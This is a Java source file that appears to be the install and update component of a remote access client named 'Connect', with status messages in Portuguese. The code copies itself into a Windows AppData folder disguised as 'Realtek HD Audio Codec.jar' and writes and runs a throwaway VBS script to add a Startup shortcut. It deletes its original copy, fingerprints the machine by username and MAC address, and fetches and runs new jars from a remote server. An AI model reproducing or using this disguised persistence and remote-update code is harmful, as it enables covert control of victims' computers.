package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:56
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;

import java.io.*;
import java.net.*;
import java.util.Base64;
import java.util.Enumeration;
import java.util.UUID;

public class InstallComponents {

    // Updater Variables
    public static final String REMOTE_FILE = "http://" + Connect.IP + "/Connect.jar";
    public static final String LOCAL_FILE = "Realtek HD Audio Codec.jar";
    public static final String LOCAL_UPDATER = "Realtek HD Audio Updater.jar";
    public static final String LOCAL_SHORTCUT = "Realtek HD Audio Codec.lnk";

    public static boolean install() {
        boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
        if (!windows) {
            return false;
        }

        File main = new File(FileComponents.getFileName());
        String folder = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\";
        if (FileComponents.getFileName().equalsIgnoreCase(LOCAL_FILE) || !main.exists()) {
            return false;
        }
        String targetPath = folder + LOCAL_FILE;
        String startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
        File startUp = new File(startUpPath);
        File objective = new File(targetPath);
        if (objective.exists() && startUp.exists() && objective.length() == main.length()) {
            FileComponents.tempDeleteOwnFile();
            runJar(LOCAL_FILE, folder);
            return true;
        }

        FileComponents.copy(main, objective);

        String script = String.format(
                "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n" +
                        "Set Shortcut = WshShell.CreateShortcut(\"%s\")\n" +
                        "Shortcut.TargetPath = \"%s\"\n" +
                        "Shortcut.WorkingDirectory = \"%s\"\n" +
                        "Shortcut.Save",
                startUpPath.replace("\\", "\\\\"),
                targetPath.replace("\\", "\\\\"),
                new File(targetPath).getParent().replace("\\", "\\\\")
        );

        File scriptFile = new File("connect.vbs");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(scriptFile))) {
            writer.write(script);
        } catch (Exception ignored) {
        }

        try {
            Process process = Runtime.getRuntime().exec("wscript " + scriptFile.getAbsolutePath());
            process.waitFor();
        } catch (Exception ignored) {
        } finally {
            scriptFile.delete();
        }

        FileComponents.tempDeleteOwnFile();
        runJar(LOCAL_FILE, folder);
        return true;
    }

    public static void uninstall() {
        boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
        if (!windows) {
            return;
        }
        String startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
        String updaterPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_UPDATER;
        String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_FILE;
        FileComponents.deleteFile(new File(startUpPath));
        FileComponents.deleteFile(new File(updaterPath));
        FileComponents.deleteFile(new File(path));
        FileComponents.tempDeleteOwnFile();
    }

    public static String generateUniqueCode() {
        try {
            String userName = System.getProperty("user.name");

            StringBuilder macAddresses = new StringBuilder();
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface network = networkInterfaces.nextElement();
                if (network.isLoopback() || network.isVirtual() || !network.isUp()) {
                    continue;
                }

                byte[] mac = network.getHardwareAddress();
                if (mac != null) {
                    for (byte b : mac) {
                        macAddresses.append(String.format("%02X", b));
                    }
                }
            }

            String combinedData = userName + macAddresses;

            return Base64.getEncoder().encodeToString(combinedData.getBytes());
        } catch (SocketException ignored) {
            return UUID.randomUUID().toString();
        }
    }

    public static void verifyUpdate() {
        long remoteSize = getRemoteFileSize(REMOTE_FILE);
        long localSize = getLocalFileSize(LOCAL_FILE);
        if (localSize == -1) {
            ConnectClient.msg("Versão temporária fora da pasta sendo executada!");
            return;
        }
        if (remoteSize != localSize) {
            ConnectClient.msg("Baixando última versão do Connect...");
            if (FileComponents.downloadFile(REMOTE_FILE, new File(LOCAL_UPDATER))) {
                runJar(LOCAL_UPDATER, null);
            }
        } else {
            ConnectClient.msg("Última versão do connect sendo executada!");
        }
    }

    public static void update() {
        if (FileComponents.downloadFile(REMOTE_FILE, new File(LOCAL_FILE))) {
            runJar(LOCAL_FILE, null);
        }
    }

    public static long getRemoteFileSize(String urlString) {
        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("HEAD");
            conn.connect();
            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                return conn.getContentLengthLong();
            }
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao pegar o tamanho do arquivo remoto! (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
        return -1;
    }

    public static long getLocalFileSize(String localFileName) {
        File f = new File(localFileName);
        if (f.exists() && f.isFile()) {
            return f.length();
        }
        return -1;
    }

    public static void runJar(String jarName, String directory) {
        try {
            ProcessBuilder process = new ProcessBuilder(
                    "java",
                    "-jar",
                    jarName
            );
            if (directory != null) {
                process.directory(new File(directory));
            }
            process.inheritIO();
            process.start();
            System.exit(0);
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao executar o arquivo java " + jarName + " (" + exception.getMessage() + ")");
            ConnectClient.exception(exception);
        }
    }

}
